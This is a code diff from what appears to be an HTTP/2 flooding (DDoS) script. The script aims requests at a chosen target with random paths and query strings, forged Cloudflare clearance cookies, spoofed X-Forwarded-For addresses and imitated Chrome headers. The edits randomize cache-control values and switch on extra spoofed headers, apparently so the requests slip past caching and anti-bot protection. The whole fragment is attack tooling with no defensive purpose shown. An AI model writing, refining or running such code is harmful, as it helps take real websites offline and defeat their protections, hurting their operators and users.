@@ -631,7 +631,7 @@ const rateHeaders = [
 //{ "cookie": "cf-clearance=" + generateRandomString(16,64) },
 { "origin": "https://" + parsedTarget.host + "/" },
 { "x-requested-with": "XMLHttpRequest" },
-{ "cache-control": "private" },
+{ "cache-control": control },
 //{ "Expect-CT": "99-OK" },
 ];
 const rateHeaders2 = [
@@ -757,7 +757,6 @@ const RESTART_DELAY = 1000;
  const path = parsedTarget.path.replace(/%RAND%/, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
  const Socker = new NetSocket();
 headers[":method"] = "GET";
-headers[":method"] = "POST";
 headers[":authority"] = parsedTarget.host;
 headers["x-forwarded-proto"] = "https";
 headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
@@ -839,7 +838,7 @@ headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
-headers["cache-control"] = "no-cache";
+headers["cache-control"] = control;
 headers["X-Forwarded-For"] = spoofed;
 headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
 headers["sec-ch-ua-mobile"] = "?0";
@@ -892,7 +891,7 @@ headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
-headers["cache-control"] = "no-cache";
+headers["cache-control"] = control;
 headers["X-Forwarded-For"] = spoofed;
 headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
 headers["sec-ch-ua-mobile"] = "?0";
@@ -911,8 +910,8 @@ headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + ran
 headers["cache-control"] = control;
  //headers["sec-ch-ua"] = uaas;
 headers["accept-encoding"] = encoding;
- //headers["cdn-loop"] = "cloudflare";
- //headers["sec-ch-ua-mobile"] = "?0";
+ headers["cdn-loop"] = "cloudflare";
+ headers["sec-ch-ua-mobile"] = "?0";
 headers["upgrade-insecure-requests"] = "1";
 headers["x-requested-with"] = "XMLHttpRequest";
  
